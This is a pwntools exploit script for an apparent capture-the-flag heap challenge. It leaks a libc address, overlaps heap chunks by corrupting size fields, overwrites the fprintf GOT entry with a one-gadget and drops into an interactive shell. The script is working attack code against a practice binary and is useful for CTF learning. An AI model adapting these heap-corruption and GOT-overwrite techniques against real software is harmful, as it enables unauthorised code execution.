#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
HOST = "0.cloud.chals.io"
PORT = 12053
CHALL_BIN = "./patched"
CHALL_LIBC = "./libc.so.6"
context.log_level = "DEBUG"
gs = '''
b ringbuf_add
b ringbuf_write
b exit_wrapper
c
'''
context.binary = ELF(CHALL_BIN, checksec=False)
elf = context.binary
libc = ELF(CHALL_LIBC, checksec=False)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return gdb.debug([elf.path], gdbscript=gs)


def add(size=0x10):
    io.sendlineafter("> ", "0")
    io.sendlineafter("> ", str(size))

def write(size=0x10, data=[b"a"]):
    io.sendlineafter("> ", "3")
    io.sendlineafter("> ", str(size))
    for e in data:
        io.recvuntil("> ")
        io.send(e)

def remove(index):
    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", str(index))


def exploit():
    io.recvuntil("lol ")
    leak = io.recvline()[0:-1]
    gadget = int(leak, 16)
    offset = 0x7f00ff91a365-0x007f00ff8cb000
    print("gadget: ", hex(gadget))
    libc.address = gadget - (offset)
    print("libc base: ", hex(libc.address))
    offset = 0x10a45c
    gadget = libc.address + offset

    io.recv()
    io.sendline(str(1000))
    add(1000)
    add(1000)
    payload = [b'a'*992 + p64(0x821), b'a'*1000]
    write(2000, payload)
    remove(1)
    add(0x800)
    payload = [b'b'*1000, b'b'*1008 + p64(0x411) + p64(elf.got["fprintf"])]
    write(2024, payload)

    payload = [b"c"*1024, b"c"*992 + p64(0x821),  p64(gadget)]
    write(2032, payload)

    io.sendlineafter("> ", "4")


io = start()
exploit()
io.interactive()
